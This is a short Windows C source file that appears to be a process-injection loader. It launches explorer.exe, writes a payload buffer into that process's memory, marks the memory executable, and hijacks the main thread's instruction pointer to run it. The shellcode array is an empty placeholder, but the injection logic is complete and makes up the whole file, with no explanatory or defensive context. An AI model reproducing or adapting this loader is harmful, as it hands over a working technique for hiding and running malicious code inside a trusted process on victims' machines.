#include <windows.h>

// Configuration
char *targetPath = "explorer.exe";
unsigned char payloadBuffer[] = { /* shellcode bytes go here (unstable) */ };

int main()
{
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // 1. Create target process
    CreateProcessA(NULL, targetPath, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

    // 2. Allocate memory in target process
    SIZE_T payloadSize = sizeof(payloadBuffer);
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // 3. Write payload bytes
    WriteProcessMemory(pi.hProcess, remoteMem, payloadBuffer, payloadSize, NULL);

    // 4. Make memory executable
    DWORD oldProtect = 0;
    VirtualProtectEx(pi.hProcess, remoteMem, payloadSize, PAGE_EXECUTE_READ, &oldProtect);

    // 5. Suspend primary thread
    SuspendThread(pi.hThread);

    // 6. Get thread context
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_CONTROL;
    GetThreadContext(pi.hThread, &ctx);

    // 7. Redirect instruction pointer to payload
    #ifdef _WIN64
        ctx.Rip = (DWORD64)remoteMem;
    #else
        ctx.Eip = (DWORD)remoteMem;
    #endif

    // 8. Set modified thread context
    SetThreadContext(pi.hThread, &ctx);

    // 9. Resume thread
    ResumeThread(pi.hThread);

    // 10. Cleanup
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}


